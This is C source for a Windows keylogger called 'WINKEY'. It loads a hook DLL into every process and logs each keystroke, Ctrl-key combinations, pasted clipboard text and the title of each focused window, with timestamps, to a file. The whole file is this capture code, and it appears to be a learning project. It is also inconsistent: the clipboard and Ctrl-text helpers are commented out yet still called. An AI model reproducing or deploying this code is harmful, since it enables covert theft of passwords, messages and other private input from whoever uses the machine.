#include <Windows.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>
#include <stdio.h>
#include <psapi.h>

#include <strsafe.h>
#include <stdlib.h>

#include "Winkey.h"

HWND   g_hWnd;
HWND   g_hWndCurrentFocus;
HANDLE g_hLogFile;
UINT   UWM_WINKEY = 0;

void LogNewKbdFocus(HANDLE hFile, HWND hwnd)
{
    TCHAR      currentActiveWindowTitle[1024];
    TCHAR      logBuffer[2048];
    SYSTEMTIME st            = {0};
    size_t     szLogBuffer   = sizeof(logBuffer);
    int        nBytesWritten = 0;

    nBytesWritten = GetWindowText(hwnd, currentActiveWindowTitle,
                                  NSIZE(currentActiveWindowTitle));
    if (nBytesWritten == 0)
    {
        return;
    }
    GetLocalTime(&st);
    if (StringCchPrintf(logBuffer, NSIZE(logBuffer),
                        WINKEY_LOG_KBD_FOCUS_CHANGE_FORMAT, st.wYear, st.wMonth,
                        st.wDay, st.wHour, st.wMinute, st.wSecond,
                        currentActiveWindowTitle) != S_OK)
    {
        return;
    }
    if (StringCbLength(logBuffer, NSIZE(logBuffer), &szLogBuffer) != S_OK)
    {
        return;
    }
    WriteFile(hFile, logBuffer, szLogBuffer, NULL, NULL);
}

void LogKeystroke(HANDLE hFile, TCHAR c)
{
    LPCTSTR output;
    TCHAR   buffer[2] = {0};
    size_t  szWrite;

    switch (c)
    {
    case 0x08:
        output = TEXT("[BACKSPACE]");
        break;
    case 0x0A:
        output = TEXT("[ENTER]");
        break;
    case 0x0D:
        output = TEXT("[ENTER]");
        break;
    case 0x1B:
        output = TEXT("[ESC]");
        break;
    default:
        buffer[0] = c;
        output    = buffer;
        break;
    }
    StringCbLength(output, 4, &szWrite);
    WriteFile(hFile, output, szWrite, NULL, NULL);
}

void WinEventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd,
                  LONG idObject, LONG idChild, DWORD idEventThread,
                  DWORD dwmsEventTime)
{
    if (event == EVENT_OBJECT_FOCUS)
    {
        if (hwnd == NULL || IsWindow(hwnd) != TRUE)
        {
            return;
        }
        if (g_hWndCurrentFocus == hwnd)
        {
            return;
        }
        g_hWndCurrentFocus = hwnd;
        LogNewKbdFocus(g_hLogFile, g_hWndCurrentFocus);
    }

    UNREFERENCED_PARAMETER(hWinEventHook);
    UNREFERENCED_PARAMETER(idObject);
    UNREFERENCED_PARAMETER(idChild);
    UNREFERENCED_PARAMETER(idEventThread);
    UNREFERENCED_PARAMETER(dwmsEventTime);
}

// /*
//  * @brief Get the clipboard text.
//  *
//  * @param hwnd The window handle.
//  * @return const TCHAR* The clipboard text or NULL.
//  */
// const TCHAR* GetClipboardText(HWND hwnd)
// {
//     TCHAR* result  = NULL;
//     TCHAR* pchData = NULL;
//     HANDLE hData   = NULL;
//     size_t szData  = 0;

//     OpenClipboard(hwnd);
// #ifdef UNICODE
//     hData = GetClipboardData(CF_UNICODETEXT);
// #else
//     hData = GetClipboardData(CF_TEXT);
// #endif
//     if (hData == NULL)
//     {
//         goto cleanClipboard;
//     }
//     pchData = (TCHAR*)GlobalLock(hData);

//     if (StringCchLength(pchData, STRSAFE_MAX_CCH, &szData) != S_OK)
//     {
//         goto globalUnlock;
//     }
//     result = malloc(szData * sizeof(TCHAR));
//     if (result == NULL)
//     {
//         goto globalUnlock;
//     }
//     StringCchCopy(result, szData, pchData);

// globalUnlock:
//     GlobalUnlock(hData);
// cleanClipboard:
//     CloseClipboard();
//     return result;
// }

// const TCHAR* GetCrtlText(TCHAR c)
// {
//     const TCHAR format[] = TEXT("[CRTL + %c]");
//     size_t      szResult = sizeof(format) + sizeof(TCHAR);
//     TCHAR*      result   = NULL;

//     result = malloc(szResult);
//     if (result == NULL)
//     {
//         return NULL;
//     }

//     StringCchPrintfEx(result, szResult, NULL, NULL, 0, format, c + 'A' - 1);

//     return result;
// }

/**
 * @brief
 *
 * @param c
 * @param isAllocated
 * @return const TCHAR*
 */
static const TCHAR* GetSpecialKeyValue(TCHAR c)
{
    const TCHAR* result       = NULL;
    SHORT        crtlKeyState = 0;

    /* GetKeyState can be called here because the WM_CHAR message is about to be
     * returned by GetMessage/PeekMessage.
     */
    crtlKeyState = GetKeyState(VK_CONTROL);
    if (crtlKeyState & 0x8000)
    {
        if (c == CRTL_V)
        {
            result = GetClipboardText(g_hWndCurrentFocus);
        }
        else
        {
            result = GetCrtlText(c);
        }
    }
    else
    {
        switch (c)
        {
        case VK_RETURN:
            break;
        }
    }

    return result;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == UWM_WINKEY)
    {
        LogKeystroke(g_hLogFile, (TCHAR)wParam);
    }
    else
    {
        switch (uMsg)
        {
        case WM_CREATE:
            g_hLogFile = CreateFile(WINKEY_LOG_FILENAME_TEXT, GENERIC_WRITE,
                                    FILE_SHARE_READ, NULL, OPEN_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL, NULL);
            if (g_hLogFile == INVALID_HANDLE_VALUE)
            {
                PostQuitMessage(0);
                break;
            }
            if (GetLastError() != ERROR_ALREADY_EXISTS)
            {
                BYTE UTF_16LE_BOM[] = {0xFF, 0xFE};
                WriteFile(g_hLogFile, UTF_16LE_BOM, sizeof(UTF_16LE_BOM), NULL,
                          NULL);
            }
            SetFilePointer(g_hLogFile, 0, NULL, FILE_END);
            break;
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC         hdc = BeginPaint(hwnd, &ps);

            FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));

            EndPaint(hwnd, &ps);
            break;
            // I am commenting my code.
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
        }
    }

    return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PWSTR pCmdLine, int nCmdShow)
{
    const TCHAR   CLASS_NAME[] = TEXT("WINKEY");
    MSG           msg          = {0};
    WNDCLASS      wc           = {0};
    HWINEVENTHOOK hWinEventHook;
    HHOOK         hHook;
    HINSTANCE     hHookDll;
    FARPROC       setInstallingHwnd;
    FARPROC       GetMessageProc;

    wc.lpfnWndProc   = WindowProc;
    wc.hInstance     = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    g_hWnd = CreateWindowEx(0, CLASS_NAME, TEXT("WINKEY"), WS_OVERLAPPEDWINDOW,
                            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
                            CW_USEDEFAULT, NULL, NULL, hInstance, NULL);

    if (g_hWnd == NULL)
    {
        return 0;
    }

    /* Load and configure DLL and install hook. */

    hHookDll = LoadLibrary(HOOK_DLL_FILENAME_WSTR);
    if (hHookDll == NULL)
    {
        return 0;
    }
    GetMessageProc    = GetProcAddress(hHookDll, "GetMessageProc");
    setInstallingHwnd = GetProcAddress(hHookDll, "setInstallingHwnd");
    if (GetMessageProc == NULL || setInstallingHwnd == NULL)
    {
        return 0;
    }
    hHook =
        SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMessageProc, hHookDll, 0);
    if (hHook == NULL)
    {
        return 0;
    }
    setInstallingHwnd(g_hWnd);

    UWM_WINKEY = RegisterWindowMessage(WINKEY_CHAR_WSTR);
    if (UWM_WINKEY == 0)
    {
        return 0;
    }

    /* Install WinEvent hook for retrieving the current window that has keyboard
     * focus. */

    hWinEventHook = SetWinEventHook(
        EVENT_OBJECT_FOCUS, EVENT_OBJECT_FOCUS, NULL, WinEventproc, 0, 0,
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS |
            WINEVENT_SKIPOWNTHREAD);

    if (hWinEventHook == NULL)
    {
        return 0;
    }

    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    CloseHandle(g_hLogFile);

    FreeLibrary(hHookDll);
    UnhookWinEvent(hWinEventHook);
    UnhookWindowsHookEx(hHook);

    return 0;

    UNREFERENCED_PARAMETER(pCmdLine);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(nCmdShow);
}